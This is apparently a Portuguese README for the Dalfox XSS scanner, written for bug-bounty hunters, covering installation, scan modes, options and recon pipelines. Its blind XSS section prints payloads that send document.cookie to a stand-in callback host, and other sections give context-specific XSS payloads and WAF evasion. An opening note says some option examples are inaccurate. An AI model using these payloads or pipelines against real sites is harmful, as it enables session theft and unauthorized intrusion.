# 🦊 Dalfox — framework de análise de XSS

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

> **Nota de versão e precisão:** os exemplos seguem a geração Go v2; o projeto atual distingue-a da geração v3 em Rust. Na v2, `-p` seleciona parâmetros, não um payload; `--custom-payload` recebe um ficheiro. As opções `--skip-mining-*` controlam a pesquisa de parâmetros, não a identificação da aplicação. Uma interação de retorno, por si só, não comprova execução de JavaScript: valide o contexto e o impacto. [Projeto e versões](https://github.com/hahwul/dalfox#v2) e [opções v2 no código oficial](https://github.com/hahwul/dalfox/blob/v2/cmd/root.go). *Payload* é a entrada de teste; *callback* é a interação de retorno.

```
  ██████╗  █████╗ ██╗     ███████╗ ██████╗ ██╗  ██╗
  ██╔══██╗██╔══██╗██║     ██╔════╝██╔═══██╗╚██╗██╔╝
  ██║  ██║███████║██║     █████╗  ██║   ██║ ╚███╔╝ 
  ██║  ██║██╔══██║██║     ██╔══╝  ██║   ██║ ██╔██╗ 
  ██████╔╝██║  ██║███████╗██║     ╚██████╔╝██╔╝ ██╗
  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝
         Ferramenta poderosa de análise e deteção de XSS
```

<p align="center">
  <img src="https://img.shields.io/badge/Dalfox-XSS_Scanner-blue?style=for-the-badge" alt="Dalfox">
  <img src="https://img.shields.io/badge/Reflected_XSS-green?style=for-the-badge" alt="Reflected">
  <img src="https://img.shields.io/badge/Bug_Bounty-red?style=for-the-badge" alt="Bug Bounty"><br>
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

---

## 📋 Índice

- [O que é o Dalfox](#-what-is-dalfox)
- [Instalação](#-installation)
- [Utilização básica](#-basic-usage)
- [Modos de análise](#-scanning-modes)
- [Opções avançadas](#-advanced-options)
- [XSS cego (blind XSS)](#-blind-xss)
- [Referência rápida](#-quick-reference)

---

<a id="-what-is-dalfox"></a>
## 🎯 O que é o Dalfox

O **Dalfox** é uma ferramenta poderosa de análise e deteção de vulnerabilidades XSS:

- 🔍 **Análise de parâmetros** - Encontrar pontos de reflexão
- 🎯 **Deteção de XSS** - Refletido e baseado no DOM
- 💉 **XSS cego (blind XSS)** - Testes fora de banda (out-of-band)
- ⚡ **Rápido** - Desenvolvido em Go, com elevado paralelismo

### Porquê o Dalfox?

| Funcionalidade | Vantagem |
|---------|---------|
| Análise inteligente | Payloads adaptados ao contexto |
| Deteção de WAF | Contornar WAF comuns |
| XSS cego (blind XSS) | Suporte de interações fora de banda (OOB) |
| Modo de pesquisa de parâmetros (mining) | Encontrar parâmetros em JavaScript |

---

<a id="-installation"></a>
## 🚀 Instalação

```bash
# Instalação com Go (recomendada)
go install github.com/hahwul/dalfox/v2@latest

# Homebrew (macOS)
brew install dalfox

# Snap (Linux)
sudo snap install dalfox

# Verificar
dalfox version
```

---

<a id="-basic-usage"></a>
## 📖 Utilização básica

### Um único URL

```bash
# Análise básica
dalfox url https://example.com/search?q=test

# Guardar a saída
dalfox url https://example.com/search?q=test -o results.txt
```

### Vários URLs

```bash
# A partir da entrada padrão
cat urls.txt | dalfox pipe

# A partir de ficheiro
dalfox file urls.txt

# Com paralelismo
cat urls.txt | dalfox pipe -w 50
```

### Modo silencioso

```bash
# Mostrar apenas vulnerabilidades
dalfox url https://example.com/search?q=test --silence

# Sem cores
dalfox url https://example.com/search?q=test --no-color
```

---

<a id="-scanning-modes"></a>
## 🔎 Modos de análise

### Modo de URL

```bash
# Analisar um URL
dalfox url https://example.com/page?param=value

# Analisar com dados
dalfox url https://example.com/page?param=value -d "post_param=value"
```

### Modo de entrada por pipe

```bash
# A partir da entrada padrão
echo "https://example.com/search?q=test" | dalfox pipe

# Vários URLs
cat urls_with_params.txt | dalfox pipe
```

### Modo de ficheiro

```bash
# A partir de ficheiro
dalfox file urls.txt

# Com saída guardada
dalfox file urls.txt -o results.txt
```

### Modo de servidor

```bash
# Iniciar o servidor de API
dalfox server

# Porta personalizada
dalfox server -p 8080

# Enviar depois os pedidos:
# POST http://localhost:8090/scan
# {"url": "https://example.com/search?q=test"}
```

---

<a id="-advanced-options"></a>
## ⚙️ Opções avançadas

### Cabeçalhos personalizados

```bash
# Adicionar um cabeçalho
dalfox url https://example.com/search?q=test -H "Authorization: Bearer token"

# Vários cabeçalhos
dalfox url https://example.com/search?q=test \
  -H "Cookie: session=abc" \
  -H "X-Forwarded-For: 127.0.0.1"
```

### Cookie e autenticação

```bash
# Com cookie
dalfox url https://example.com/search?q=test -C "session=abc123"

# Autenticação Basic
dalfox url https://example.com/search?q=test --basic-auth "user:pass"
```

### Payloads personalizados

```bash
# Utilizar um ficheiro de payloads personalizado
dalfox url https://example.com/search?q=test --custom-payload payloads.txt

# Um payload personalizado
dalfox url https://example.com/search?q=test -p '<script>alert(1)</script>'

# Formato dos payloads no ficheiro:
# <script>alert(1)</script>
# <img src=x onerror=alert(1)>
# <svg onload=alert(1)>
```

### Formatos de saída

```bash
# Saída JSON
dalfox url https://example.com/search?q=test --format json -o result.json

# Apenas vulnerabilidades
dalfox url https://example.com/search?q=test --only-poc
```

### Desempenho

```bash
# Definir workers (paralelismo)
dalfox url https://example.com/search?q=test -w 100

# Tempo limite (segundos)
dalfox url https://example.com/search?q=test --timeout 10

# Intervalo entre pedidos (ms)
dalfox url https://example.com/search?q=test --delay 100
```

### Evasão de WAF

```bash
# Utilizar o contorno de WAF
dalfox url https://example.com/search?q=test --waf-evasion

# Ignorar a identificação da aplicação
dalfox url https://example.com/search?q=test --skip-mining
```

### Proxy

```bash
# Proxy HTTP
dalfox url https://example.com/search?q=test --proxy http://127.0.0.1:8080

# Para Burp Suite
dalfox url https://example.com/search?q=test --proxy http://127.0.0.1:8080
```

---

<a id="-blind-xss"></a>
## 💉 XSS cego (blind XSS)

### Utilizar um payload de XSS cego

```bash
# Com XSS Hunter / Burp Collaborator
dalfox url https://example.com/form?input=test -b "https://your.xss.ht"

# A opção -b acrescenta callbacks de blind XSS
```

### XSS cego com um payload personalizado

```bash
# Payload blind personalizado
dalfox url https://example.com/form?name=test \
  --blind "https://your.xss.ht" \
  --custom-payload blind_payloads.txt
```

### Exemplos de payloads de XSS cego

```html
"><img src=x onerror="fetch('https://your.xss.ht/'+document.cookie)">
"><script src="https://your.xss.ht"></script>
'"><script>new Image().src="https://your.xss.ht/?c="+document.cookie</script>
```

---

<a id="-quick-reference"></a>
## 📊 Referência rápida

### Comandos básicos

| Comando | Descrição |
|---------|-------------|
| `dalfox url URL` | Analisar um URL |
| `dalfox file file.txt` | Analisar alvos a partir de um ficheiro |
| `cat urls \| dalfox pipe` | Analisar a partir da entrada padrão |
| `dalfox server` | Iniciar o servidor de API |

### Opções essenciais

| Opção | Descrição |
|------|-------------|
| `-o file.txt` | Ficheiro de saída |
| `-w 50` | Unidades de execução (paralelismo) |
| `-H "Header: value"` | Cabeçalho personalizado |
| `-C "cookie=value"` | Cookie |
| `-b "url"` | Callback de XSS cego |
| `--proxy URL` | Proxy HTTP |
| `--timeout 10` | Tempo limite do pedido |

### Opções de saída

| Opção | Descrição |
|------|-------------|
| `--format json` | Saída JSON |
| `--only-poc` | Mostrar apenas a prova de conceito (PoC) |
| `--silence` | Modo silencioso |
| `--no-color` | Saída sem cores |

### Opções de payloads

| Opção | Descrição |
|------|-------------|
| `-p "payload"` | Payload personalizado |
| `--custom-payload file` | Ficheiro de payloads |
| `--waf-evasion` | Modo para contornar WAF |

---

## 🎯 Fluxos de trabalho de bug bounty

### Análise básica de XSS

```bash
# Análise rápida
dalfox url "https://target.com/search?q=test" --silence
```

### A partir da recolha de URLs

```bash
# GAU + Dalfox
gau target.com | grep "=" | dalfox pipe -o xss_results.txt

# Wayback + Dalfox
echo target.com | waybackurls | grep "=" | dalfox pipe --silence
```

### Análise em grande escala

```bash
# Analisar todos os parâmetros dos URLs
cat all_urls.txt | grep "?" | dalfox pipe -w 100 -o found_xss.txt
```

### Com padrões do GF

```bash
# Utilizar GF + Dalfox
gau target.com | gf xss | dalfox pipe --silence

# Com filtro httpx
gau target.com | gf xss | httpx -silent | dalfox pipe
```

### Análise com autenticação

```bash
# Com uma sessão
dalfox url "https://target.com/dashboard?search=test" \
  -C "session=abc123" \
  -H "Authorization: Bearer token" \
  -o auth_xss.txt
```

### Cadeia de ferramentas abrangente

```bash
# Pipeline completo de investigação de XSS
subfinder -d target.com -silent | \
  httpx -silent | \
  gau | \
  gf xss | \
  uro | \
  dalfox pipe -w 50 --silence -o xss_vulnerabilities.txt
```

### Campanha de XSS cego

```bash
# Blind XSS em vários alvos
cat contact_forms.txt | dalfox pipe -b "https://your.xss.ht" --silence

# Especificamente para formulários de entrada
cat form_urls.txt | dalfox pipe \
  -b "https://your.xss.ht" \
  --custom-payload blind_xss.txt \
  -w 10
```

---

## 💡 Sugestões para procurar XSS

1. **Verifique todos os parâmetros** - Incluindo os que são menos óbvios
2. **Teste contextos diferentes** - HTML, JavaScript e atributos
3. **Utilizar XSS cego (blind XSS)** - Em painéis de administração e registos
4. **Combine com redirecionamentos abertos** - Para aumentar o impacto
5. **Verifique os cabeçalhos da resposta** - CSP, X-XSS-Protection
6. **Teste parâmetros POST** - São frequentemente esquecidos

### Pontos de injeção de XSS comuns

```
- Pesquisar boxes
- Utilizador profile fields
- Comentários e opiniões
- Parâmetros do URL
- Cabeçalhos HTTP (Referer, User-Agent)
- Nomes de ficheiros carregados
- Mensagens de erro
```

### Payloads específicos de cada contexto

| Contexto | Payload |
|---------|---------|
| HTML | `<script>alert(1)</script>` |
| Atributo | `" onmouseover="alert(1)"` |
| JavaScript | `';alert(1)//` |
| URL | `javascript:alert(1)` |

---

## 📚 Recursos

- [Dalfox GitHub](https://github.com/hahwul/dalfox)
- [XSS Payloads](https://github.com/payloadbox/xss-payload-list)

### Guias de referência relacionados
- [Metodologia de bug bounty](../../Bug-Bounty-Methodology/translations/README.pt.md)
- [XSS Payloads](../../Payloads/translations/XSS.pt.md)
- [Burp Suite](../../Burp-Suite/translations/README.pt.md)

---

<p align="center">
  <b>🦊 Encontre vulnerabilidades XSS!</b><br>
  <i>Dalfox: o aliado de quem procura XSS</i>
</p>
